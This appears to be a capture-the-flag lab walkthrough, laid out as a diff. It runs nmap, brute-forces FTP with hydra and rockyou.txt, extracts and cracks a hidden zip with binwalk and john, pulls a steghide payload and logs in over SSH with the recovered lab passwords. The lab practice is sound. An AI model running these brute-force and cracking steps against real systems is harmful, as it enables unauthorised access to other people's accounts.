@@ -1,0 +1,94 @@
+>> nmap 10.10.236.25
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+>> In burp suite changed user-agent to R and recived:
+"What are you doing! Are you one of the 25 employees? If not, I going to report this incident"
+and
+/agent_C_attention.php:
+"Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R"
+###
+
+>> hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.236.25
+[21][ftp] host: 10.10.236.25   login: chris   password: crystal
+
+ftp: chris@crystal
+mget:
+ To_agentJ.txt
+ cute-alien.jpg
+ cutie.png
+
+###
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+###
+
+>> exiftool cutie.png
+>> exiftool cute-alien.jpg
+
+>> binwalk cutie.png -> Output: "Zlib compressed data"
+	
+>> binwalk cute-alien.jpg -> Output: "JPEG image data"
+
+dump the file to hex format:
+>> xxd cutie.png
+000087c0: 2080 a481 0000 0000 546f 5f61 6765 6e74   .......To_agent
+000087d0: 522e 7478 740a 0020 0000 0000 0001 0018  R.txt.. ........
+>> binwalk -e cutie.png
+
+/$exracted_cutie:
+>> zip2john 8702.zip > hash.txt
+>> john hash.txt
+Proceeding with wordlist:/opt/john/password.lst
+alien            (8702.zip/To_agentR.txt)
+
+###
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+###
+
+Checked 'QXJlYTUx' in https://www.base64decode.org/
+found: Area51
+
+>> steghide extract -sf cute-alien.jpg
+password: Area51
+
+###
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+###
+
+>> ssh james@10.10.236.25 : hackerrules!
+
+james@>> python3 -m http.server 1234
+>> wget http://10.10.236.25:1234/Alien_autospy.jpg
+OR
+>> sudo scp james@10.10.236.25:Alien_autospy.jpg ~/
+
+TIPS: Reverse image and Foxnews.
+# Roswell alien autopsy #
+
+
+
